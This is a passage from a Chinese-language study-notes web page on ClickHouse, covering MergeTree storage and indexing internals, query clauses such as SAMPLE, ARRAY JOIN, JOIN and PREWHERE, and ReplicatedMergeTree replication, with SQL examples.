HTTP、DBMS</td></tr><tr><td>complex_key_hashed</td><td>散列</td><td>复合型Key</td><td>Local file、 Executable file、 HTTP、DBMS</td></tr><tr><td>ip_trie</td><td>层次结构</td><td>复合型Key（单个String）</td><td>Local file、 Executable file、 HTTP、DBMS</td></tr><tr><td>cache</td><td>固定大小数组</td><td>UInt64</td><td>Executable file、HTTP、 ClickHouse、MySQL</td></tr><tr><td>complex_key_cache</td><td>固定大小数组</td><td>复合型Key</td><td>Executable file、HTTP、 ClickHouse、MySQL</td></tr></tbody></table><h2 id="第6章-MergeTree原理解析"><a href="#第6章-MergeTree原理解析" class="headerlink" title="第6章 MergeTree原理解析"></a>第6章 MergeTree原理解析</h2><p>表引擎是ClickHouse的一大特色，表引擎决定了一张表的特性，比如数据以何种形式被存储以及如何被加载。</p><p>合并树（MergeTree）是ClickHouse中最常用的表引擎，因为只有MergeTree系列（MergeTree的变种表引擎有很多）的表引擎才支持<strong>主键索引</strong>、<strong>数据分区</strong>、<strong>数据副本</strong>、<strong>数据采样</strong>这些特性，同时也只有此系列表引擎支持ALTER相关操作。</p><h3 id="6-1-MergeTree的创建方式与存储结构"><a href="#6-1-MergeTree的创建方式与存储结构" class="headerlink" title="6.1 MergeTree的创建方式与存储结构"></a>6.1 MergeTree的创建方式与存储结构</h3><ul><li><p>MergeTree创建方式</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> [<span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span>] [db_name.]table_name (name1 [<span class="hljs-keyword">type</span>] [<span class="hljs-keyword">DEFAULT</span>|<span class="hljs-keyword">MATERIALIZED</span>|<span class="hljs-keyword">ALIAS</span> expr],    name2 [<span class="hljs-keyword">type</span>] [<span class="hljs-keyword">DEFAULT</span>|<span class="hljs-keyword">MATERIALIZED</span>|<span class="hljs-keyword">ALIAS</span> expr],    <span class="hljs-comment">--省略 ...</span>) <span class="hljs-keyword">ENGINE</span> = MergeTree()  <span class="hljs-comment">--选择合并树表引擎</span>[<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> expr]<span class="hljs-comment">--选填，分区键</span>[<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> expr]<span class="hljs-comment">--必填，排序键</span>[PRIMARY <span class="hljs-keyword">KEY</span> expr]<span class="hljs-comment">--选题，主键</span>[<span class="hljs-keyword">SAMPLE</span> <span class="hljs-keyword">BY</span> expr]<span class="hljs-comment">--选题，抽样表达式</span>[<span class="hljs-keyword">SETTINGS</span> <span class="hljs-keyword">name</span> = <span class="hljs-keyword">value</span>,省略...]<span class="hljs-comment">--index_granularity[选填]，索引粒度，默认8192（每隔8192行生成一条索引）;index_granularity[选填]，每一批写书数据的体量大小，默认10M；enable_mixed_granularity_parts[选填]，设置是否开启自适应索引间隔，默认开启；merge_mixed_with_ttl_timeout[选填]；storage_policy[选填]</span></code></pre></div></li></ul><ul><li><p>MergeTree存储结构</p><blockquote><div class="hljs code-wrapper"><pre><code class="hljs sql">table_name│├─partition_1<span class="hljs-comment">-- 分区目录</span>│    ├─ checksums.txt<span class="hljs-comment">-- 检验文件，二进制格式存储</span>│    ├─ colums.txt<span class="hljs-comment">-- 列文件，明文格式存储，保存该分区下的字段信息</span>│    ├─ count.txt<span class="hljs-comment">-- 计数文件，明文格式存储，记录该分区下数据的总行数</span>│    ├─ primary.idx<span class="hljs-comment">-- 一级索引文件，二进制格式存储，用于存放稀疏索引</span>│    ├─ [Column].bin<span class="hljs-comment">-- 数据文件，压缩格式存储（默认LZ4压缩格式）</span>│    ├─ [Column].mrk<span class="hljs-comment">-- 列字段标记文件，二进制格式存储，保存了.bin文件的数据偏移量</span>│    ├─ [Column].mrk2<span class="hljs-comment">-- 如果使用了适应性大小的间隔索引，作用和原理与.mrk文件相同</span>│    ├─ partition.dat<span class="hljs-comment">-- 使用了分区才会生成，保存当前分区表达式最终生成的值</span>│    ├─ minmax_[Column].idx<span class="hljs-comment">-- 使用了分区才会生成，记录当前分区原始字段最大值和最小值</span>│    ├─ skp_idx _[Column].idx<span class="hljs-comment">-- 使用了二级索引才会生成</span>│    ├─ skp_idx _[Column].mrk<span class="hljs-comment">-- 使用了二级索引才会生成</span>│    └─ partition_2│ └─ partition_n</code></pre></div></blockquote></li></ul><h3 id="6-2-数据分区"><a href="#6-2-数据分区" class="headerlink" title="6.2 数据分区"></a>6.2 数据分区</h3><h4 id="6-2-1-数据的分区规则"><a href="#6-2-1-数据的分区规则" class="headerlink" title="6.2.1 数据的分区规则"></a>6.2.1 数据的分区规则</h4><ul><li>ID在不同分区类型下的示例</li></ul><table><thead><tr><th>类型</th><th>样例数据</th><th>分区表达式</th><th>分区ID</th></tr></thead><tbody><tr><td>整型</td><td>18，19，20</td><td>PARTITION BY Age</td><td>分区1：18；分区2：19；分区3：20</td></tr><tr><td>日期</td><td>2021-05-01，2021-05-2</td><td>PARTITION BY EventTime</td><td>分区1：20210501；分区2：20210502</td></tr><tr><td>其他</td><td>‘<a href="http://www.nauu.com’" target="_blank" rel="noopener">www.nauu.com’</a></td><td>PARTITION BY URL</td><td>分区1：15b31467</td></tr></tbody></table><h4 id="6-2-2-分区目录的命名规则"><a href="#6-2-2-分区目录的命名规则" class="headerlink" title="6.2.2 分区目录的命名规则"></a>6.2.2 分区目录的命名规则</h4><p>分区目录 = 分区ID（PartitionID）+MaxBlockNum+MinBlockNum+Level</p><p>例如分区目录是202105_1_1_0</p><blockquote><p>MaxBlockNum和MinBlockNum是最大数据块编号和最小数据块编号（跟数据压缩的数据压缩块无关）</p></blockquote><h4 id="6-2-3-分区目录的合并过程"><a href="#6-2-3-分区目录的合并过程" class="headerlink" title="6.2.3 分区目录的合并过程"></a>6.2.3 分区目录的合并过程</h4><p>MinBlockNum：取同一分区内所有目录中最小的MinBlockNum值</p><p>MaxBlockNum：取同一分区内所有目录中最小的MaxBlockNum值</p><p>Level：取同一分区内最大Level值并加1</p><h3 id="6-3-一级索引"><a href="#6-3-一级索引" class="headerlink" title="6.3 一级索引"></a>6.3 一级索引</h3><h4 id="6-3-1-稀疏索引"><a href="#6-3-1-稀疏索引" class="headerlink" title="6.3.1 稀疏索引"></a>6.3.1 稀疏索引</h4><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211109165101.png" width="50%"> </p><h4 id="6-3-2-索引粒度"><a href="#6-3-2-索引粒度" class="headerlink" title="6.3.2 索引粒度"></a>6.3.2 索引粒度</h4><p>ClickHouse中索引粒度默认为8192，数据以index_granularity的粒度（默认8192）被标记成多个小的区间，其中每个区间最多8192行数据。</p><h4 id="6-3-3-索引数据的生成规则"><a href="#6-3-3-索引数据的生成规则" class="headerlink" title="6.3.3 索引数据的生成规则"></a>6.3.3 索引数据的生成规则</h4><p>由于是稀疏索引，所以MergeTree需要间隔 index_granularity 行数据才会生成一条索引记录。</p><h4 id="6-3-4-索引的查询过程"><a href="#6-3-4-索引的查询过程" class="headerlink" title="6.3.4 索引的查询过程"></a>6.3.4 索引的查询过程</h4><p>根据索引粒度生成多个MarkRange，两个相邻的MarkRange相距步长为1，所有MarkRange（整个数据片段）的最大数值区间为[0,+inf]</p><p>索引查询过程分为3个步骤：</p><ol><li><p>生成查询条件区间。例如：</p><p>WHERE ID = ‘A003’ → [‘A003’ , ‘A003’]</p><p>WHERE ID &gt; ‘A003’ → [‘A003’ ,  +inf]</p></li><li><p>递归交集判断：以递归的形式，依次对MarkRange的数值区间与条件区间做交集判断，从最大的区间[0 , +inf]开始：</p><ul><li>如果不存在交集，则直接通过剪枝算法优化此整段MarkRange</li><li>如果存在交集，且MarkRange不可再分解（步长小于8），则记录MarkRange并返回</li></ul></li><li><p>合并MarkRange区间：将最终匹配的MarkRange聚在一起，合并它们的范围。</p></li></ol><h3 id="6-4-二级索引"><a href="#6-4-二级索引" class="headerlink" title="6.4 二级索引"></a>6.4 二级索引</h3><p>二级索引又称为跳数索引，默认关闭，开启命令为：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> allow_experimental_data_skipping_indices = <span class="hljs-number">1</span></code></pre></div><h3 id="6-5-数据存储"><a href="#6-5-数据存储" class="headerlink" title="6.5 数据存储"></a>6.5 数据存储</h3><h4 id="6-5-1-各列独立存储"><a href="#6-5-1-各列独立存储" class="headerlink" title="6.5.1 各列独立存储"></a>6.5.1 各列独立存储</h4><p>每个字段都有一个对应的.bin文件，这些.bin文件承载着物理存储。</p><p>存储的具体实现L：数据经过压缩后按照ORDER BY的声明排序，最后数据以压缩数据块的形式被组织写入.bin文件中</p><h4 id="6-5-2-压缩数据块"><a href="#6-5-2-压缩数据块" class="headerlink" title="6.5.2 压缩数据块"></a>6.5.2 压缩数据块</h4><p>JavaEnable.bin</p><blockquote><blockquote><p>压缩数据块0</p><p>hear stat(65536, 12000)</p></blockquote><blockquote><p>压缩数据块1</p><p>hear stat(65536, 14660)</p></blockquote><p>…</p></blockquote><p>MergeTree在数据具体的写入过程中，会按照索引粒度（默认8192行），按批次获取数据并进行处理。如果把一批数据的未压缩大小设为size，则整个写入过程遵循以下规则：</p><ol><li>单个批次数据 size &lt; 64KB：继续获取下一个批数据，直至累积到 size &gt;= 64 KB，生成下一个压缩数据块</li><li>单个批次数据  64 KB &lt;= size &lt;= 1 MB​：直接生成下一个压缩数据块</li><li>单个批次数据  size &gt;= 1 MB​：先按照1MB大小截断并生成下一个数据块，剩余数据继续依照上述规则执行。</li></ol><h3 id="6-6-数据标记"><a href="#6-6-数据标记" class="headerlink" title="6.6 数据标记"></a>6.6 数据标记</h3><p>下面用一个类比来说明数据标记是什么及其作用</p><blockquote><p>MergeTree表：书</p><p>primary.idx（一级索引）：章节目录</p><p>.bin（数据文件）：书中的内容</p><p>.mrk（数据标记）：章节与内容之间的联系（数据标记记录两个信息：1、页码；2、某段内容起始位置）</p></blockquote><h3 id="6-7-对于分区、索引、标记和压缩数据的协同总结"><a href="#6-7-对于分区、索引、标记和压缩数据的协同总结" class="headerlink" title="6.7 对于分区、索引、标记和压缩数据的协同总结"></a>6.7 对于分区、索引、标记和压缩数据的协同总结</h3><h4 id="6-7-1-写入过程"><a href="#6-7-1-写入过程" class="headerlink" title="6.7.1 写入过程"></a>6.7.1 写入过程</h4><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211109214943.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h4 id="6-7-2-查询过程"><a href="#6-7-2-查询过程" class="headerlink" title="6.7.2 查询过程"></a>6.7.2 查询过程</h4><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211109215057.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h4 id="6-7-3-数据标记与压缩数据块的对应关系"><a href="#6-7-3-数据标记与压缩数据块的对应关系" class="headerlink" title="6.7.3 数据标记与压缩数据块的对应关系"></a>6.7.3 数据标记与压缩数据块的对应关系</h4><ol><li><p>多对一</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211109215201.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li><li><p>一对一</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211109215215.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li><li><p>一对多</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211109215238.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li></ol><h2 id="第9章-数据查询"><a href="#第9章-数据查询" class="headerlink" title="第9章 数据查询"></a>第9章 数据查询</h2><h3 id="9-3-SAMPLE语句"><a href="#9-3-SAMPLE语句" class="headerlink" title="9.3 SAMPLE语句"></a>9.3 SAMPLE语句</h3><p>SAMPLE子句能够实现数据采样的功能，使查询返回采样数而不是全部数据，从而减少查询负载。SAMPLE子句的采样机制是一种<strong>幂等</strong><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="幂等性：指多次操作,结果是一致。 数学表达式为： f(x) = f(f(x))">[1]</span></a></sup>设计，所以相同的采样规则能返回相同的数据，这项特性适用于那些可以接受近似查询结果的场景。</p><p>SAMPLE子句只能用于MergeTree系列引擎的数据表，并且要求在<code>CREATE TABLE</code>时声明<code>SAMPLE BY</code>抽样表达式，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> hits_t1 (    <span class="hljs-keyword">ID</span> UInt64,    EventTime <span class="hljs-built_in">DATE</span>,    UserID UInt64) <span class="hljs-keyword">ENGINE</span> = MergeTree()<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> toYYYYMM(EventTime)<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> (<span class="hljs-keyword">ID</span>,intHash32(UserID))<span class="hljs-comment">-- SAMPLE Key声明的表达式必须也包含在主键的声明中</span><span class="hljs-keyword">SAMPLE</span> <span class="hljs-keyword">BY</span> intHash32(UserID)</code></pre></div><p><code>SAMPLE BY intHash32(UserID)</code>表示该表内的数据，按照<code>intHash32(UserID)</code>分布后的结果采样查询。</p><blockquote><p>声明 SAMPLE Key的注意事项：</p><ol><li>SAMPLE BY 所声明的表达式必须同时包含在主键的声明内；</li><li>SAMPLE Key 必须是int类型（如果不是，建表时不会报错但会在查询时得到异常）。</li></ol></blockquote><ul><li><p>SAMPLE factor</p><p>factor范围在[0,1]，当factor是0或1的时候等同于不采样</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">ID</span> <span class="hljs-keyword">FROM</span> hits_t1 <span class="hljs-keyword">SAMPLE</span> <span class="hljs-number">0.1</span></code></pre></div><p>近似取10%的数据</p></li><li><p>SAMPLE rows</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">COUNT</span>() <span class="hljs-keyword">FROM</span> hits_t1 <span class="hljs-keyword">SAMPLE</span> <span class="hljs-number">10000</span></code></pre></div><p>近似采样10000行的数据</p></li><li><p>SAMPLE factor OFFSET n</p><p>OFFSET 表示偏移量</p></li></ul>  <div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">COUNT</span>() <span class="hljs-keyword">FROM</span> hits_t1 <span class="hljs-keyword">SAMPLE</span> <span class="hljs-number">0.5</span> <span class="hljs-keyword">OFFSET</span> <span class="hljs-number">0.4</span></code></pre></div><p>  从二分之一处按0.4的系数采样（若出现了溢出则自动截断）</p><h3 id="9-4-ARRAY-JOIN子句"><a href="#9-4-ARRAY-JOIN子句" class="headerlink" title="9.4 ARRAY JOIN子句"></a>9.4 ARRAY JOIN子句</h3><p>ARRAY JOIN 允许在表的内部，与数组或嵌套类型的字段进行JOIN操作，从而将一行数组展开为多行。（类似Hive里的<code>LATERNAL VIEW EXPLODE</code>函数）</p><p>例如在表query_t1中：</p><table><thead><tr><th>id</th><th>value</th></tr></thead><tbody><tr><td>1</td><td>[1,2,3]</td></tr><tr><td>2</td><td>[3,4]</td></tr><tr><td>3</td><td>[ ]</td></tr></tbody></table><h4 id="9-4-1-INNER-ARRAY-JOIN"><a href="#9-4-1-INNER-ARRAY-JOIN" class="headerlink" title="9.4.1 INNER ARRAY JOIN"></a>9.4.1 INNER ARRAY JOIN</h4><ul><li>demo</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">value</span> <span class="hljs-keyword">FROM</span> query_t1 <span class="hljs-built_in">ARRAY</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">value</span></code></pre></div><p>得到结果：</p><table><thead><tr><th>id</th><th>value</th></tr></thead><tbody><tr><td>1</td><td>1</td></tr><tr><td>1</td><td>2</td></tr><tr><td>1</td><td>3</td></tr><tr><td>2</td><td>3</td></tr><tr><td>2</td><td>4</td></tr></tbody></table><p>排除掉了空行</p><blockquote><p>跟Hive的数组行转列很像，Hive中是这样写的：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,v <span class="hljs-keyword">FROM</span> LATERNAL <span class="hljs-keyword">VIEW</span> <span class="hljs-keyword">EXPLODE</span>(<span class="hljs-keyword">value</span>,<span class="hljs-string">','</span>) table_tmp <span class="hljs-keyword">AS</span> v</code></pre></div></blockquote><ul><li>添加别名</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">value</span>,v <span class="hljs-keyword">FROM</span> query_t1 <span class="hljs-built_in">ARRAY</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">AS</span> v</code></pre></div><p>得到结果：</p><table><thead><tr><th>id</th><th>value</th><th>value</th></tr></thead><tbody><tr><td>1</td><td>[1,2,3]</td><td>1</td></tr><tr><td>1</td><td>[1,2,3]</td><td>2</td></tr><tr><td>1</td><td>[1,2,3]</td><td>3</td></tr><tr><td>2</td><td>[3,4]</td><td>3</td></tr><tr><td>2</td><td>[3,4]</td><td>4</td></tr></tbody></table><h4 id="9-4-2-LEFT-ARRAY-JOIN"><a href="#9-4-2-LEFT-ARRAY-JOIN" class="headerlink" title="9.4.2 LEFT ARRAY JOIN"></a>9.4.2 LEFT ARRAY JOIN</h4><ul><li><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">value</span>,v <span class="hljs-keyword">FROM</span> query_t1 <span class="hljs-built_in">ARRAY</span> <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">AS</span> v</code></pre></div></li></ul><p>得到结果：</p><table><thead><tr><th>id</th><th>value</th><th>v</th></tr></thead><tbody><tr><td>1</td><td>[1,2,3]</td><td>1</td></tr><tr><td>1</td><td>[1,2,3]</td><td>2</td></tr><tr><td>1</td><td>[1,2,3]</td><td>3</td></tr><tr><td>2</td><td>[3,4]</td><td>3</td></tr><tr><td>2</td><td>[3,4]</td><td>4</td></tr><tr><td>3</td><td>[ ]</td><td>0</td></tr></tbody></table><p>改为LEFT查询以后，在INNER JOIN 中被排除的空数组出现了在返回的结果集中。</p><blockquote><p>当同时对多个数组字段进行ARRAY JOIN 操作时，查询的计算逻辑是按行合并而不是产生笛卡尔积，例如</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">value</span>,v,arrayMap(x -&gt; x * <span class="hljs-number">2</span>,<span class="hljs-keyword">value</span>) <span class="hljs-keyword">AS</span> mapv,v_1 <span class="hljs-keyword">FROM</span> query_t1 <span class="hljs-built_in">ARRAY</span> <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">AS</span> v,mapv <span class="hljs-keyword">AS</span> v_1</code></pre></div><p>得到结果：</p><table><thead><tr><th>id</th><th>value</th><th>v</th><th>mapv</th><th>v_1</th></tr></thead><tbody><tr><td>1</td><td>[1,2,3]</td><td>1</td><td>[2,4,6]</td><td>2</td></tr><tr><td>1</td><td>[1,2,3]</td><td>2</td><td>[2,4,6]</td><td>4</td></tr><tr><td>1</td><td>[1,2,3]</td><td>3</td><td>[2,4,6]</td><td>6</td></tr><tr><td>2</td><td>[3,4]</td><td>3</td><td>[6,8]</td><td>6</td></tr><tr><td>2</td><td>[3,4]</td><td>4</td><td>[6,8]</td><td>8</td></tr><tr><td>3</td><td>[ ]</td><td>0</td><td>[ ]</td><td>0</td></tr></tbody></table></blockquote><h3 id="9-5-JOIN子句"><a href="#9-5-JOIN子句" class="headerlink" title="9.5 JOIN子句"></a>9.5 JOIN子句</h3><p>ClickHouse的JOIN语法包含<strong>连接精度</strong>和<strong>连接类型</strong>两部分：连接精度+连接类型+JOIN</p><p>连接精度：ALL / ANY / ASOF (默认ALL)</p><p>连接类型：</p><ol><li>外连接：LEFT / RIGHT / FULL(OUTER)</li><li>内连接：INNER</li><li>外连接：CROSS</li></ol><h4 id="9-5-1-连接精度"><a href="#9-5-1-连接精度" class="headerlink" title="9.5.1 连接精度"></a>9.5.1 连接精度</h4><p>ALL：如果左边作为基表，右表中有多行数据与之连接匹配，则返回右表中全部连接数据。</p><p>ANY：如果左边作为基表，右表中有多行数据与之连接匹配，则返回右表中<strong>第一行</strong>连接数据。</p><p>ASOF：ASOF是一种模糊连接，它允许在连接键之后追加定义一个模糊连接的匹配条件 asof_column（感觉有点玄学，插个眼，mark）</p><h4 id="9-5-2-连接类型"><a href="#9-5-2-连接类型" class="headerlink" title="9.5.2 连接类型"></a>9.5.2 连接类型</h4><p>跟MySQL一样</p><h4 id="9-5-3-多表连接"><a href="#9-5-3-多表连接" class="headerlink" title="9.5.3 多表连接"></a>9.5.3 多表连接</h4><p>跟MySQL一样</p><h4 id="9-5-4-注意事项"><a href="#9-5-4-注意事项" class="headerlink" title="9.5.4 注意事项"></a>9.5.4 注意事项</h4><ol><li><p>关于性能</p><p>首先，应该遵循<strong>左大又小</strong>的原则，即将数据量小的表放在右侧（跟MySQL或Hive的小表JOIN大表不太一样），因为ClickHouse中所有连接方式，右表都会被全部加载到内存中与左表进行比较。</p><p>其次，<strong>JOIN查询目前没有缓存的支持</strong>，这意味着每一次JOIN查询，即便是连续执行的相同SQL，也都会生成一次全新的执行计划。故如果大量使用JOIN查询，则需要进一步考虑借助上次应用侧的缓存服务或使用JOIN表引擎来改善性能。</p><p>最后，如果是<strong>在大量维度属性不全的查询场景中，建议使用字典代替JOIN查询</strong>。因为在进行多表的连接查询时，查询会转换成两两连接的形式，这种“滚雪球”式的查询很可能带来性能问题。</p></li><li><p>关于空值策略与简写形式</p><p>ClickHouse中连接查询的空值（未被连接的数据）是由默认值填充的，这跟其他常见的数据库的策略不同（由Null填充）。ClickHouse中连接查询的空值策略是通过<code>join_use_nulls</code>参数指定的，默认为0，默认充填0（当该参数为1时，空值由Null填充）。</p><p>此外，JOIN Key支持简化写法，当数据表的连接字段名相同时，可以用<code>USING</code>语法简写，例如下面两条语句的效果是等同的：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a.id,a.name,b.rate <span class="hljs-keyword">FROM</span> join_tb1 a<span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> join_tb2 b <span class="hljs-keyword">ON</span> a.id = b.id<span class="hljs-comment">-- USING简写</span><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">name</span>,rate <span class="hljs-keyword">FROM</span> join_tb1<span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> join_tb2 <span class="hljs-keyword">USING</span> <span class="hljs-keyword">id</span></code></pre></div></li></ol><h3 id="9-6-WHERE与PREWHERE子句"><a href="#9-6-WHERE与PREWHERE子句" class="headerlink" title="9.6 WHERE与PREWHERE子句"></a>9.6 WHERE与PREWHERE子句</h3><p>WHERE子句基于条件表达式来实现数据过滤（这个跟其他数据库一样），如果过滤条件恰好是主键字段，则能够借助索引进一步加速查询，所以WHERE子句是查询语句能否启用索引的判断依据（前提是表引擎支持索引特性）。</p><p>PREWHERE目前只能用于MergeTree系列的表引擎，它是WHERE的一种优化，结果相同。它的不同之处在于：使用PREWHERE时，首先只会读取PREWHERE指定的列字段数据，用于数据过滤的条件判断，待数据过滤之后再读取SELECT声明的列字段以补全其余属性。所以再一些场合中PREWHERE相比WHERE处理的数据量更少（处理的数据行数可能没变，但是数据大小变小了），性能更高。</p><p>PREWHERE优化默认打开，会在条件合适的情况下将WHERE替换为PREWHERE，其参数设置语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> optimize_move_to_prewhere = <span class="hljs-number">1</span> <span class="hljs-comment">--参数为0时强制关闭</span></code></pre></div><h3 id="9-7-GROUP-BY子句"><a href="#9-7-GROUP-BY子句" class="headerlink" title="9.7 GROUP BY子句"></a>9.7 GROUP BY子句</h3><p>GROUP BY后声明的字段通常称为<strong>聚合键</strong>或Key，在ClickHouse中的聚合查询中 SELECT 后只声明了聚合函数，则可以省略GROUP BY关键字，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SUM</span>(a1),<span class="hljs-keyword">SUM</span>(a2) <span class="hljs-keyword">FROM</span> t1</code></pre></div><p>SELECT的字段只能是聚合键、聚合函数，否则会报错。</p><p>除了上述特性外，聚合查询还能配合<code>WITH ROLLUP</code>、<code>WITH CUBE</code>、<code>WITH TOTALS</code>三种修饰符获取额外的汇总信息。</p><h4 id="9-7-1-WITH-ROLLUP"><a href="#9-7-1-WITH-ROLLUP" class="headerlink" title="9.7.1 WITH ROLLUP"></a>9.7.1 WITH ROLLUP</h4><p>ROLLUP能够按照聚合键从右向左上卷，基于聚合函数依次生成分组小计和总计。如果聚合键为n​，则最终会生成小计的个数为n+1​。</p><h4 id="9-7-2-WITH-ROLLUP"><a href="#9-7-2-WITH-ROLLUP" class="headerlink" title="9.7.2 WITH ROLLUP"></a>9.7.2 WITH ROLLUP</h4><p>CUBE会像立方体模型一样，基于聚合键之间所有的组合生成小计信息。如果聚合键为n，则最终会生成小计的个数为2的n​次方。</p><h4 id="9-7-3-WITH-TOTALS"><a href="#9-7-3-WITH-TOTALS" class="headerlink" title="9.7.3 WITH TOTALS"></a>9.7.3 WITH TOTALS</h4><p>TOTALS会基于聚合函数对所有数据进行总计，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a1,<span class="hljs-keyword">SUM</span>(a2),<span class="hljs-keyword">COUNT</span>(a3) <span class="hljs-keyword">FROM</span> t1<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> a1 <span class="hljs-keyword">WITH</span> TOTALS</code></pre></div><p>其结果会额外显示累计总和的结果。</p><h3 id="9-10-LIMIT-BY子句"><a href="#9-10-LIMIT-BY子句" class="headerlink" title="9.10 LIMIT BY子句"></a>9.10 LIMIT BY子句</h3><p>LIMIT BY子句运行于ORDER BY 之后和LIMIT之前，最多返回<strong>前n​个字段</strong>的数据，其常规语法如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql">LIMIT n BY 字段</code></pre></div><h2 id="第10章"><a href="#第10章" class="headerlink" title="第10章"></a>第10章</h2><h3 id="10-1-概述"><a href="#10-1-概述" class="headerlink" title="10.1 概述"></a>10.1 概述</h3><p>用Nx表示一个节点（服务器），例如N1,N2</p><p>副本和分片有时候一样，有时候不一样，区分方法：</p><p>如果N1的Y和N2的Y数据相同，则它们互为副本（N1Y = N2Y），否则互为分片（N1Y != N2Y）</p><h3 id="10-2-数据副本"><a href="#10-2-数据副本" class="headerlink" title="10.2 数据副本"></a>10.2 数据副本</h3><p>MegreTree表引擎前缀加了Replicated才有应用副本的能力（还有另一种副本的实现方式），例如ReplicatedMergeTree、ReplicatedReplacingMergeTree、ReplicatedSummingMergeTree，这类表引擎称为复制表系列引擎。</p><p>ReplicatedMergeTree在MergeTree的基础上加入了分布式协同的能力，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211110102012.png" srcset="/img/loading.gif" lazyload="" width="70%"></p><p>在MergeTree中，一个数据分区由开始创建到全部完成，会经历两类存储区域：</p><ol><li>内存：数据首先会被写入内存缓冲区</li><li>本地磁盘：数据接着会被写入tmp临时目录分区，待全部完成后再将临时目录重新命名为正式分区</li></ol><ul><li>ReplicatedMergeTree在上述基础上增加了Zookeeper的部分，它会进一步在Zookeeper内创建一系列的监听节点，并以此实现多个实例之间的通信。在整个通信过程中，Zookeeper并不会涉及数据表的传输。</li></ul><h3 id="10-3-ReplicatedMergeTree原理解析"><a href="#10-3-ReplicatedMergeTree原理解析" class="headerlink" title="10.3 ReplicatedMergeTree原理解析"></a>10.3 ReplicatedMergeTree原理解析</h3><p>ReplicatedMergeTree的核心逻辑中，大量运用了Zookeeper的能力，以实现ReplicatedMergeTree副本实例之间的协同，包括主副本选举、副本状态感知、操作日志分发、任务队列和BlockID去重判断等。</p><p>副本协同的核心流程主要有<strong>INSERT</strong>、<strong>MERGE</strong>、<strong>MUTATION</strong>、<strong>ALTER</strong>，分别对应了数据写入、分区合并、数据修改、元数据修改。（其他查询不支持分布式执行，包括SELECT、CREATE、DROP、RENAME、ATTACH）</p><p>拟定一个用ReplicatedMergeTree实现一张拥有1分片、1副本的数据表的演示场景，其完整过程如下：</p><ul><li><p>INSERT的核心执行流程</p><ol><li>创建第一个副本实例</li><li>创建第二个副本实例</li><li>向第一个副本实例写入数据</li><li>由第一个副本实例推送Log日志</li><li>第二个副本实例拉取Log日志</li><li>第二个副本实例向其他副本发起下载请求</li><li>第一个副本实例响应数据下载</li><li>第二个实例下载数据并完成本地写入</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211110104346.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li><li><p>MERGE的核心执行流程</p><ol><li>创建远程连接，尝试与主副本通信</li><li>主副本接收通信</li><li>由主副本制定MERGE计划并推送Log日志</li><li>各副本分别拉取Log日志</li><li>各个副本分别在本地执行MERGE</li></ol><p><img 